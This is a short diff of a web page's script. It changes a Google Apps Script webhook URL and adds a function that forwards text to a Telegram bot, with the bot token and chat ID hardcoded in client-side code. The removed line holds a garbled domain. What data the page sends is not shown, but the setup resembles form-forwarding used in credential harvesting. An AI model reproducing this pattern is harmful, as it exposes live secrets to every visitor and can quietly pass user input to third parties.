@@ -226,7 +226,7 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby83r6izzGv9ZNYbTVkUFldCOWns_ourFktMGi2yxQtOZUjMvPpo0z_TJXRsWZmtz2V7w/exec';
+        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwNVyba_xewRN-Er7UkyIWY89Oxr0Oq9w1Z7o2UpdNxRrzyEllJ21jt1JCthNIarFI/exec';
         const TELEGRAM_BOT_TOKEN = '8676025127:AAGRYE5Pp6hBCKk6eQQL42aqObliIarQ41Q';
         const TELEGRAM_CHAT_ID = '5642832782';
 
@@ -289,7 +289,8 @@
         });
 
         function sendTelegramMessage(text) {
-            const url = `https://api.нент.org/...`; // Kept intact for your webhook setup
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` + encodeURIComponent(text);
+            fetch(url).catch(err => console.error('Telegram error:', err));
         }
 
         function sendToGoogleScript(data) {
